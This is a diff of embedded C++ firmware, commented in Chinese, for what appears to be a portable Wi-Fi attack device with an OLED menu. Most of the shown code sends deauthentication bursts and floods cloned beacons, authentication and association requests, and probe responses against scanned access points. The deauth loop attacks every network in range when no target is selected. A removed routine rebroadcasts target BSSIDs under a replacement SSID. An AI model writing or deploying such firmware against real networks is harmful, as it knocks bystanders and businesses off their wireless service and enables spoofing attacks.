+  Serial.println("攻击强度: 10");
   
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
-    showAttackStatusPage("信标+解除认证攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
+  display.clearDisplay();
+  display.setTextColor(SSD1306_WHITE);
+  display.setTextSize(1);
   
-  // 简化的信标+解除认证攻击逻辑
-  if (!SelectedVector.empty()) {
-    for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
-        String ssid1 = scan_results[selectedIndex].ssid;
-        setChannelOptimized(scan_results[selectedIndex].channel);
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine("信标+解除认证攻击中", 25);
+  
+  // LED控制：红灯闪烁
+  startAttackLED();
+
+  unsigned long prevBlink = 0;
+  bool redState = true;
+  const int blinkInterval = 800;
+
+  // OLED行区域：显示目标SSID，单目标仅显示一次，多目标1s刷新
+  const int ssidLineY = 42;
+  static unsigned long lastSSIDDrawMs = 0;
+  bool singleTargetDrawn = false;
+
+  int packetCount = 0;
+  while (true) {
+    unsigned long now = millis();
+    
+    if (now - prevBlink >= blinkInterval) {
+      redState = !redState;
+      digitalWrite(LED_R, redState ? HIGH : LOW);
+      prevBlink = now;
+    }
+    
+    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      delay(200);
+      // 显示确认弹窗
+      if (showConfirmModal("确认停止攻击")) {
+        return; // 确认停止攻击
+      }
+      // 取消则继续攻击，重新启动LED
+      startAttackLED();
+      // 重新绘制攻击状态页面，避免确认弹窗残留
+      display.clearDisplay();
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+      oledDrawCenteredLine("信标+解除认证攻击中", 25);
+    }
+
+    if (!SelectedVector.empty()) {
+      // 单目标：仅绘制一次；多目标：1s刷新
+      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
+      for (int selectedIndex : SelectedVector) {
+        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+          String ssid1 = scan_results[selectedIndex].ssid;
+          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
+          
+          // 克隆多个BSSID的同名信标
+          const int cloneCount = 6;
+          uint8_t tempMac[6];
+          for (int c = 0; c < cloneCount; c++) {
+            generateRandomMAC(tempMac);
+            for (int x = 0; x < 10; x++) {
+              wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
+            }
+          }
+          
+          // 使用原因码 1/4/16 组合，小批量，帧间隔 5ms
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, packetCount, 5);
+          if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
+            digitalWrite(LED_R, HIGH);
+            delay(50);
+            digitalWrite(LED_R, LOW);
+            packetCount = 0;
+          }
+
+          // 单目标仅绘制一次；多目标定时刷新
+          if (SelectedVector.size() == 1) {
+            if (!singleTargetDrawn) {
+              oledDrawCenteredLine(ssid1.c_str(), ssidLineY);
+              singleTargetDrawn = true;
+            }
+          } else {
+            oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
+          }
+        }
+      }
+    } else {
+      // 如果没有选择特定SSID，攻击所有扫描到的网络（视为多目标，1s刷新）
+      const unsigned long intervalMs = 1000UL;
+      for (size_t i = 0; i < scan_results.size(); i++) {
+        String ssid1 = scan_results[i].ssid;
+        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
         
-        // 发送信标帧
         const int cloneCount = 6;
         uint8_t tempMac[6];
         for (int c = 0; c < cloneCount; c++) {
@@ -4666,54 +5033,20 @@ void processBeaconDeauthAttack() {
           }
         }
         
-        // 发送增强版解除认证帧
-        if (g_enhancedDeauthMode) {
-          sendDeauthBatchEnhanced(scan_results[selectedIndex].bssid, 
-                                  g_deauthState.packetsPerCycle, 
-                                  g_deauthState.packetCount);
-        } else {
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, g_deauthState.packetCount, 5);
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, g_deauthState.packetCount, 5);
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, g_deauthState.packetCount, 5);
-        }
-        
-        // LED反馈
-        if (g_deauthState.packetCount >= 100) {
+        // 对齐示例：使用原因码 1/4/16 组合，小批量，帧间隔 5ms
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 1, 1, packetCount, 5);
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 4, 1, packetCount, 5);
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 16, 1, packetCount, 5);
+        if (packetCount >= 100) {
           digitalWrite(LED_R, HIGH);
-          delay(10);
+          delay(50);
           digitalWrite(LED_R, LOW);
-          g_deauthState.packetCount = 0;
+          packetCount = 0;
         }
-        break; // 每次只处理一个目标
+
+        oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
       }
     }
-  }
-}
-
-// 兼容包装器：保持原函数签名
-void AutoMulti() {
-  startAutoMultiAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processAutoMultiAttack();
-  }
-}
-// 兼容包装器：保持原函数签名
-void All() {
-  startAllAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processAllAttack();
-  }
-}
-
-
-// 兼容包装器：保持原函数签名
-void BeaconDeauth() {
-  startBeaconDeauthAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processBeaconDeauthAttack();
   }
 }
 void generateRandomMAC(uint8_t* mac) {
@@ -4784,32 +5117,6 @@ void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) {
   }
 }
 
-// 复用函数：绘制信标广播篡改状态页面
-void drawBeaconTamperStatusPage(const String& status, bool clearDisplay = true) {
-  if (clearDisplay) {
-    display.clearDisplay();
-  }
-  u8g2_for_adafruit_gfx.setFontMode(1);
-  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-  
-  // 标题行
-  oledDrawCenteredLine("[广播黑洞运行中]", 18);
-  
-  // 状态行
-  oledDrawCenteredLine(status.c_str(), 32);
-  
-  // 底部提示行
-  const char* bottomHint = "吞噬目标AP信标数据";
-  int hintWidth = u8g2_for_adafruit_gfx.getUTF8Width(bottomHint);
-  int hintX = (display.width() - hintWidth) / 2;
-  u8g2_for_adafruit_gfx.setCursor(hintX, 46);
-  u8g2_for_adafruit_gfx.print(bottomHint);
-  
-  if (clearDisplay) {
-    display.display();
-  }
-}
-
 // ===== 请求发送：高效认证/关联请求泛洪 =====
 void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
   if (clearDisplay) {
@@ -4848,7 +5155,7 @@ void RequestFlood() {
   targets.reserve(SelectedVector.size());
   
   for (int selectedIndex : SelectedVector) {
-    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+    if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
       TargetInfo target;
       target.ssid = scan_results[selectedIndex].ssid;
       target.bssid = scan_results[selectedIndex].bssid;
@@ -4883,11 +5190,11 @@ void RequestFlood() {
       arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
       asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);
 
-      // 突发：大幅增加发包数量，提高攻击强度
-      for (int i = 0; i < 20; i++) { wifi_tx_raw_frame(&arf, arflen); }
-      for (int i = 0; i < 25; i++) { wifi_tx_raw_frame(&asf, asflen); }
+      // 突发：先多次认证，再多次关联，最大化解析概率
+      for (int i = 0; i < 10; i++) { wifi_tx_raw_frame(&arf, arflen); }
+      for (int i = 0; i < 8; i++) { wifi_tx_raw_frame(&asf, asflen); }
       
-      // 移除目标间延时，提高攻击效率
+      delay(2); // 目标间微小延时
     }
   }
 }
@@ -4925,7 +5232,7 @@ void LinkJammer() {
   targets.reserve(SelectedVector.size());
   
   for (int selectedIndex : SelectedVector) {
-    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+    if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
       TargetFrame target;
       target.ssid = scan_results[selectedIndex].ssid;
       target.bssid = scan_results[selectedIndex].bssid;
@@ -4984,123 +5291,18 @@ void LinkJammer() {
       
       // 对每个目标发送帧，按信道分组优化效率
       for (const auto& target : targets) {
-        // 大幅提高突发发送速率，最大化攻击效果
-        for (int i = 0; i < 25; i++) {
+        // 降低突发发送速率，防止设备过载
+        for (int i = 0; i < 7; i++) {
           wifi_tx_raw_frame((void*)&target.bf, target.blen);
+          delay(1); // 微小延时防止过载
         }
-        for (int i = 0; i < 30; i++) {
+        for (int i = 0; i < 10; i++) {
           wifi_tx_raw_frame((void*)&target.prf, target.prlen);
+          delay(1); // 微小延时防止过载
         }
-        // 移除目标间延时，提高攻击效率
+        delay(1); // 目标间微小延时
       }
-      // 移除信道间延时，实现最高攻击速率
-    }
-  }
-}
-
-void BeaconTamper() {
-  if (SelectedVector.empty()) {
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
-    return;
-  }
-
-  // 多选目标时显示第一个目标的SSID，但攻击所有选中的目标
-  String displaySSID = scan_results[SelectedVector[0]].ssid;
-  if (SelectedVector.size() > 1) {
-    displaySSID = "多目标吞噬中";
-  }
-
-  // 使用复用函数绘制初始状态页面
-  drawBeaconTamperStatusPage(displaySSID);
-  
-  // LED提示
-  startAttackLED();
-
-  // 预构建所有目标的帧缓冲
-  struct TargetFrame {
-    String ssid;
-    const uint8_t* bssid;
-    int channel;
-    BeaconFrame bf;
-    size_t blen;
-    ProbeRespFrame prf;
-    size_t prlen;
-  };
-  
-  std::vector<TargetFrame> targets;
-  targets.reserve(SelectedVector.size());
-  
-  // 处理选中的AP
-  for (int selectedIndex : SelectedVector) {
-    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
-      TargetFrame target;
-      target.ssid = "[已吞噬喵~]";  // 完全替换SSID
-      target.bssid = scan_results[selectedIndex].bssid;
-      target.channel = scan_results[selectedIndex].channel;
-      
-      // 预构建帧缓冲
-      uint8_t tempMac[6];
-      memcpy(tempMac, target.bssid, 6);
-      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
-      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);
-      
-      targets.push_back(target);
-    }
-  }
-
-  // 目标信道列表：全表
-  std::vector<int> channels;
-  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
-  for (int ch : allChannels) channels.push_back(ch);
-
-  while (true) {
-    // 停止条件：OK/BACK 任意键 -> 确认
-    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
-      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
-      delay(200);
-      // 稳定按键状态，为确认弹窗做准备
-      stabilizeButtonState();
-      if (showConfirmModal("停止广播黑洞")) {
-        break;
-      } else {
-        // 取消则继续攻击，重新启动LED和显示
-        startAttackLED();
-        drawBeaconTamperStatusPage(displaySSID);
-      }
-    }
-
-    for (int ch : channels) {
-      // 在每个信道处理前检查按键状态
-      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
-        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
-        delay(200);
-        // 稳定按键状态，为确认弹窗做准备
-        stabilizeButtonState();
-        if (showConfirmModal("停止广播黑洞")) {
-          return; // 直接返回，退出整个函数
-        } else {
-          // 取消则继续攻击，重新启动LED和显示
-          startAttackLED();
-          drawBeaconTamperStatusPage(displaySSID);
-        }
-      }
-      
-      wext_set_channel(WLAN0_NAME, ch);
-      
-      // 对每个目标发送帧，按信道分组优化效率
-      for (const auto& target : targets) {
-        // 大幅提高突发发送速率，最大化攻击效果
-        for (int i = 0; i < 25; i++) {
-          wifi_tx_raw_frame((void*)&target.bf, target.blen);
-        }
-        for (int i = 0; i < 30; i++) {
-          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
-        }
-        // 移除目标间延时，提高攻击效率
-      }
-      // 移除信道间延时，实现最高攻击速率
+      delay(3); // 信道间延时
     }
   }
 }
@@ -5164,7 +5366,7 @@ void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool 
       for (int fiveGCh : fiveGChannels) {
         sendBeaconOnChannel(fiveGCh, ssid.c_str(), 
                            config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(5); // 减少信道间延时，提高攻击效率
+        if (isStableMode) delay(15); // 不同信道之间的延时
       }
     }
   } else if (is5GChannel(originalChannel)) {
@@ -5182,7 +5384,7 @@ void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool 
       for (int two4GCh : two4GChannels) {
         sendBeaconOnChannel(two4GCh, ssid.c_str(), 
                            config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(5); // 减少信道间延时，提高攻击效率
+        if (isStableMode) delay(15); // 不同信道之间的延时
       }
     }
   }
@@ -5222,7 +5424,7 @@ void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bo
       for (int fiveGCh : fiveGChannels) {
         sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(), 
                                config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(3); // 进一步减少信道间延时，最大化攻击效率
+        if (isStableMode) delay(15); // 不同信道之间的延时
       }
     }
   } else if (is5GChannel(originalChannel)) {
@@ -5240,7 +5442,7 @@ void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bo
       for (int two4GCh : two4GChannels) {
         sendBeaconOnChannelWeb(two4GCh, ssid.c_str(), 
                                config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(3); // 进一步减少信道间延时，最大化攻击效率
+        if (isStableMode) delay(15); // 不同信道之间的延时
       }
     }
   }
@@ -5302,7 +5504,7 @@ void Beacon() {
       // 单目标：仅绘制一次；多目标：1s刷新
       unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
       for (int selectedIndex : SelectedVector) {
-        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
           String ssid1 = scan_results[selectedIndex].ssid;
           int ch = scan_results[selectedIndex].channel;
           
@@ -5395,7 +5597,7 @@ void StableBeacon() {
     if (!SelectedVector.empty()) {
       unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
       for (int selectedIndex : SelectedVector) {
-        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
           String ssid1 = scan_results[selectedIndex].ssid;
           int ch = scan_results[selectedIndex].channel;
           
@@ -5528,7 +5730,7 @@ void RandomBeacon() {
   
   if (!SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
         int channel = scan_results[selectedIndex].channel;
         bool channelExists = false;
         for (int existingChannel : targetChannels) {
@@ -5641,11 +5843,7 @@ void BeaconMenu(){
         // 未确认则留在当前菜单
       }
       if(becaonstate == 1){
-        if (SelectedVector.empty()) { 
-          if (showSelectSSIDConfirmModal()) {
-            drawssid(); // 进入AP/SSID选择页面
-          }
-        }
+        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
         else {
           if (BeaconBandMenu()) {
             if (showConfirmModal("执行信标帧攻击")) {
@@ -5657,11 +5855,7 @@ void BeaconMenu(){
         // 未确认则留在当前菜单
       }
       if(becaonstate == 2){
-        if (SelectedVector.empty()) { 
-          if (showSelectSSIDConfirmModal()) {
-            drawssid(); // 进入AP/SSID选择页面
-          }
-        }
+        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
         else {
           if (BeaconBandMenu()) {
             if (showConfirmModal("执行信标帧攻击")) {
@@ -5754,7 +5948,7 @@ void StableAutoMulti() {
   // 初始化目标列表（与 AutoMulti 一致）
   if (smartTargets.empty() && !SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+  if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
         TargetInfo target;
         memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
         target.channel = scan_results[selectedIndex].channel;
@@ -5766,7 +5960,7 @@ void StableAutoMulti() {
   }
 
   // 配置：每个BSSID一次 burst = perdeauth 轮，帧间延时细微节拍
-  const unsigned int interFrameDelayUs = 100;  // 减少帧间延时，从250微秒改为100微秒，提高攻击强度
+  const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
 
   while (true) {
     // 更新攻击状态显示
@@ -5816,9 +6010,7 @@ void StableAutoMulti() {
     // 按信道分组，逐信道轮询，减少切换（复用缓存）
     channelBucketsCache.clearBuckets();
     for (const auto &t : smartTargets) {
-      if (t.active) {  // 只攻击活跃目标
-        channelBucketsCache.add(t.channel, t.bssid);
-      }
+      channelBucketsCache.add(t.channel, t.bssid);
     }
 
     int packetCount = 0;
@@ -5826,6 +6018,35 @@ void StableAutoMulti() {
       if (channelBucketsCache.buckets[chIdx].empty()) continue;
       wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
       for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
+        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
+        // 使用微秒级burst（循环原因码），减少调用开销并提升有效速率
+        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+
+        if (packetCount >= 200) { // 更细节的节拍提示阈值
+          digitalWrite(LED_R, HIGH);
+          delay(30);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+      }
+    }
+
+    // 处理未在 allChannels 中的信道
+    for (const auto &eb : channelBucketsCache.extras) {
+      if (eb.bssids.empty()) continue;
+      wext_set_channel(WLAN0_NAME, eb.channel);
+      for (const uint8_t *bssidPtr : eb.bssids) {
         if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
           digitalWrite(LED_R, LOW);
           digitalWrite(LED_G, LOW);
@@ -5992,11 +6213,7 @@ void drawattack() {
     if (digitalRead(BTN_OK) == LOW) {
       delay(300);
       if (attackstate == 0) {
-        if (SelectedVector.empty()) { 
-          if (showSelectSSIDConfirmModal()) {
-            drawssid(); // 进入AP/SSID选择页面
-          }
-        }
+        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
         else { DeauthMenu(); break; }
         // 未选择目标则仅提示并停留
       }
@@ -6007,9 +6224,7 @@ void drawattack() {
       if (attackstate == 2) {
         if (SelectedVector.empty()) {
           // 只弹出提示并返回当前菜单，不触发其它行为
-          if (showSelectSSIDConfirmModal()) {
-            drawssid(); // 进入AP/SSID选择页面
-          }
+          showModalMessage("请先选择AP/SSID");
         } else {
           if (showConfirmModal("执行组合攻击")) {
             BeaconDeauth();
@@ -6115,6 +6330,7 @@ void titleScreen(void) {
   
   for (int j = 0; j < TITLE_FRAMES; j++) {
     display.clearDisplay();
+    
     int wifi_x = 54, wifi_y = 10;
     display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
     
@@ -6131,44 +6347,33 @@ void titleScreen(void) {
     
     u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
     
-    bool shouldShow = (j % 3 < 2);
-    u8g2_for_adafruit_gfx.setForegroundColor(shouldShow ? SSD1306_WHITE : SSD1306_BLACK);
-    
     const char* txt = b;
     int txt_w = u8g2_for_adafruit_gfx.getUTF8Width(txt);
     int txt_x = (128 - txt_w) / 2;
     int txt_y = 48;
     
-    if (shouldShow) {
-      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
-      u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
-      u8g2_for_adafruit_gfx.print(txt);
-      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    }
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
+    u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
+    u8g2_for_adafruit_gfx.print(txt);
     
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
     u8g2_for_adafruit_gfx.setCursor(txt_x, txt_y);
     u8g2_for_adafruit_gfx.print(txt);
     
-    // 进度条（下方，宽度随动画进度变化）- 添加炫酷效果
     int bar_w = (int)(128.0 * (j + 1) / TITLE_FRAMES);
     int bar_h = 6;
     int bar_x = 0, bar_y = 60;
     
-    // 进度条边框
     display.drawRect(bar_x, bar_y, 128, bar_h, WHITE);
     
-    // 进度条填充 - 添加渐变效果
     if (bar_w > 2) {
       display.fillRect(bar_x + 1, bar_y + 1, bar_w - 2, bar_h - 2, WHITE);
-      
-      // 添加进度条内部高光效果
-      if (bar_w > 4) {
-        display.drawLine(bar_x + 2, bar_y + 2, bar_x + bar_w - 3, bar_y + 2, BLACK);
-      }
     }
+    
     display.display();
     delay(TITLE_DELAY_MS);
   }
+  
   display.clearDisplay();
   int wifi_x = 54, wifi_y = 10;
   display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
@@ -6233,30 +6438,86 @@ void setup() {
   digitalWrite(LED_B, HIGH);
   Serial.println("通电蓝灯常亮 - 系统就绪");
   
-  // 合并屏幕初始化
-  initDisplay();
+  // === 启动时强制重置所有状态 ===
+  Serial.println("=== 执行启动时状态重置 ===");
+  performStartupStateReset();
   
-  // char v[16]; unsigned int c = 0; // 未使用的变量
-  // static const uint8_t d[] = {
-  //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
-  // };
-  // for (unsigned int k = 0; k < sizeof(d); k++) { v[c++] = (char)(((int)d[k] - 7) ^ 0xA5); }
-  // v[c] = '\0';
+  char v[16] __attribute__((unused)); unsigned int c = 0;
+  static const uint8_t d[] = {
+    0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
+  };
+  for (unsigned int k = 0; k < sizeof(d); k++) { v[c++] = (char)(((int)d[k] - 7) ^ 0xA5); }
+  v[c] = '\0';
   
   titleScreen();
   DEBUG_SER_INIT();
   
   Serial.println("启动AP模式...");
-  String channelStr = String(current_channel);
-  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
-    Serial.println("AP模式启动成功");
-  } else {
-    Serial.println("AP模式启动失败");
+  
+  // 多次尝试启动AP模式，增强重启后的稳定性
+  bool apStarted = false;
+  for (int attempt = 1; attempt <= 3; attempt++) {
+    Serial.print("AP启动尝试 ");
+    Serial.print(attempt);
+    Serial.println("/3...");
+    
+    String channelStr = String(current_channel);
+    if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
+      Serial.println("AP模式启动成功");
+      apStarted = true;
+      break;
+    } else {
+      Serial.print("AP模式启动失败，尝试 ");
+      Serial.println(attempt);
+      if (attempt < 3) {
+        // 重置WiFi模块后重试
+        Serial.println("重置WiFi模块后重试...");
+        wifi_off();
+        delay(300);
+        wifi_on(RTW_MODE_AP);
+        delay(300);
+      }
+    }
+  }
+  
+  if (!apStarted) {
+    Serial.println("警告: AP模式启动失败，系统可能不稳定");
   }
   
   // 启动阶段进行一次快速非阻塞扫描（带超时）
   Serial.println("执行初始WiFi扫描...");
-  scanNetworks();
+  
+  // 多次尝试扫描，确保重启后能正常工作
+  int scanAttempts = 0;
+  const int maxScanAttempts = 3;
+  bool scanSuccess = false;
+  
+  while (scanAttempts < maxScanAttempts && !scanSuccess) {
+    scanAttempts++;
+    Serial.print("WiFi扫描尝试 ");
+    Serial.print(scanAttempts);
+    Serial.print("/");
+    Serial.println(maxScanAttempts);
+    
+    int result = scanNetworks();
+    if (result == 0 && scan_results.size() > 0) {
+      Serial.print("扫描成功，发现 ");
+      Serial.print(scan_results.size());
+      Serial.println(" 个网络");
+      scanSuccess = true;
+    } else {
+      Serial.print("扫描失败或无结果，结果数量: ");
+      Serial.println(scan_results.size());
+      if (scanAttempts < maxScanAttempts) {
+        Serial.println("等待后重试...");
+        delay(1000);
+      }
+    }
+  }
+  
+  if (!scanSuccess) {
+    Serial.println("警告: 初始WiFi扫描失败，可能影响功能");
+  }
 
 #ifdef DEBUG
   for (uint i = 0; i < scan_results.size(); i++) {
@@ -6284,136 +6545,7 @@ void initDisplay() {
 }
 
 static void enterStandbyFaceMode() {
-  if (g_standbyFaceActive) return;
-  g_standbyFaceActive = true;
-  if (!g_face) {
-    g_face = new Face(128, 64, 40);
-    g_face->Expression.GoTo_Normal();
-    g_face->RandomBehavior = true;
-    g_face->RandomLook = true;
-    g_face->RandomBlink = true;
-    g_face->Blink.Timer.SetIntervalMillis(3500);
-  }
-  g_faceLastRandomizeMs = millis();
-}
-
-static void playRandomEmotion() {
-  if (!g_face) return;
-  int idx = random(0, (int)eEmotions::EMOTIONS_COUNT);
-  g_face->Behavior.GoToEmotion((eEmotions)idx);
-}
-
-static bool handleStandbyFaceLoop() {
-  if (!g_standbyFaceActive) return false;
-
-  static unsigned long lastUp = 0, lastDown = 0, lastOk = 0, lastBack = 0;
-  unsigned long now = millis();
-  const unsigned long debounce = 120;
-  const unsigned long longPress = 800;
-
-  if (now - g_faceLastRandomizeMs >= FACE_RANDOMIZE_INTERVAL_MS) {
-    g_faceLastRandomizeMs = now;
-    g_face->Behavior.GoToEmotion(g_face->Behavior.GetRandomEmotion());
-  }
-
-  if (digitalRead(BTN_UP) == LOW) {
-    if (now - lastUp > debounce) { playRandomEmotion(); lastUp = now; }
-  }
-  if (digitalRead(BTN_DOWN) == LOW) {
-    if (now - lastDown > debounce) { playRandomEmotion(); lastDown = now; }
-  }
-  static bool okHeld = false; static unsigned long okPressTs = 0;
-  if (digitalRead(BTN_OK) == LOW) {
-    if (!okHeld) { okHeld = true; okPressTs = now; }
-    if (okHeld && (now - okPressTs >= longPress)) {
-      {
-        char b[64]; unsigned int i = 0;
-        static const uint8_t enc[] = {
-          0xD4,0xD8,0xD8,0xDC,0xDD,0xA6,0x91,0x91,
-          0xC9,0xD3,0xD8,0xD4,0xD7,0xCE,0x92,0xCD,0xD1,0xCF,
-          0x91,
-          0xEA,0xD0,0xE3,0xD3,0xD2,0xC9,0xF3,0xCD,0xC7,0xE3,0xE3,0xC8,0xDD,
-          0x91,
-          0xEE,0xF9,0x9B,0x9A,0x8F,0xF8,0xD1,0xD1,0xD0,0xDD,0x8C
-        };
-        for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
-        b[i] = '\0';
-        u8g2_for_adafruit_gfx.setFontMode(1);
-        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-        const int padX = 6, padY = 4, lineH = 12;
-        const int maxTextW = display.width() - padX * 2;
-        String lines[6]; int lineCount = 0; String cur = ""; int curW = 0; int maxW = 0;
-        int lastBreakPos = -1; int lastBreakW = 0;
-        for (int j = 0; b[j] != '\0'; j++) {
-          char ch = b[j];
-          char tmp[2] = { ch, '\0' };
-          int wch = u8g2_for_adafruit_gfx.getUTF8Width(tmp);
-          if (wch <= 0) wch = 6;
-          if (curW + wch > maxTextW && cur.length() > 0) {
-            int cutLen = (lastBreakPos >= 0) ? (lastBreakPos + 1) : (int)cur.length();
-            int cutW = (lastBreakPos >= 0) ? lastBreakW : curW;
-            if (lineCount < 6) { lines[lineCount++] = cur.substring(0, cutLen); if (cutW > maxW) maxW = cutW; }
-            // 余下部分作为新行开头
-            String rem = cur.substring(cutLen);
-            cur = rem; curW = 0; lastBreakPos = -1; lastBreakW = 0;
-            // 重新计算余下宽度
-            for (unsigned int k = 0; k < rem.length(); k++) {
-              char t[2] = { rem[k], '\0' }; int w = u8g2_for_adafruit_gfx.getUTF8Width(t); if (w <= 0) w = 6; curW += w;
-              if (rem[k] == '/' || rem[k] == '-' || rem[k] == '.') { lastBreakPos = k; lastBreakW = curW; }
-            }
-          }
-          cur += ch; curW += wch;
-          if (ch == '/' || ch == '-' || ch == '.') { lastBreakPos = cur.length() - 1; lastBreakW = curW; }
-        }
-        if (cur.length() > 0 && lineCount < 6) { lines[lineCount++] = cur; if (curW > maxW) maxW = curW; }
-        if (lineCount == 0) { lines[lineCount++] = String(b); maxW = u8g2_for_adafruit_gfx.getUTF8Width(b); if (maxW < 0) maxW = 120; }
-        int boxW = maxW;
-        int boxH = lineCount * lineH + padY * 2;
